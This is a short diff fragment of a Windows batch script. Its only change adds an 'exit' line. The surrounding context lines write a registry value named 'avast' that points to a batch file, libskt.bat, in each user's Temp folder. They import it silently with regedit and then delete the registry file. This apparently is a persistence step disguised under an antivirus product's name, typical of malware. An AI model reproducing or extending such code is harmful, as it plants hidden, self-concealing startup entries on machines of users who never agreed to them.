@@ -8,3 +8,4 @@ echo "avast"="C:\Users\%%A\AppData\Local\Temp\libskt.bat" >> proba.reg
 regedit /s proba.reg
 del proba.reg
 )
+exit
